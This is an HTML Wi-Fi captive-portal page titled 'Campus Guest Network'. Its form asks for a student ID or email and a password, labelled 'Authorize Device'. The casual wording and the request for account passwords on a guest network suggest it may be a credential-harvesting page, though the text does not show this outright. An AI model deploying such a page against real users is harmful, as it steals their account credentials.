<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Guest Wi-Fi Sign-In</title>
</head>
<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; text-align: center; background-color: #f0f2f5; padding-top: 80px; margin: 0;">

    <div style="display: inline-block; text-align: left; background: white; padding: 40px 35px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 340px; border: 1px solid #e1e4e8;">
        
        <div style="text-align: center; margin-bottom: 20px;">
            <div style="display: inline-block; background-color: #e8f0fe; padding: 12px; border-radius: 50%;">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"></path><path d="M1.42 9a16 16 0 0 1 21.16 0"></path><path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path><line x1="12" y1="20" x2="12.01" y2="20"></line></svg>
            </div>
        </div>

        <h2 style="color: #1a1a1a; margin-top: 0; margin-bottom: 8px; font-size: 22px; font-weight: 600; text-align: center;">Campus Guest Network</h2>
        <p style="color: #5f6368; font-size: 14px; text-align: center; line-height: 1.5; margin-bottom: 30px;">Type in your details for wifi fr.</p>
        
        <form action="/login" method="POST">
            <label style="font-weight: 600; color: #3c4043; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px;">Student ID or Email</label><br>
            <input type="text" name="firstname" placeholder="e.g. johnny@school.edu" required style="width: 100%; padding: 12px; margin-top: 6px; margin-bottom: 22px; border: 1px solid #dadce0; border-radius: 6px; box-sizing: border-box; font-size: 15px; outline: none; background-color: #f8f9fa;"><br>
            
            <label style="font-weight: 600; color: #3c4043; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px;">Password</label><br>
            <input type="password" name="password" placeholder="••••••••" required style="width: 100%; padding: 12px; margin-top: 6px; margin-bottom: 28px; border: 1px solid #dadce0; border-radius: 6px; box-sizing: border-box; font-size: 15px; outline: none; background-color: #f8f9fa;"><br>
            
            <input type="submit" value="Authorize Device" style="width: 100%; background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; box-shadow: 0 2px 4px rgba(26,115,232,0.2);">
        </form>
    </div>

</body>
</html>
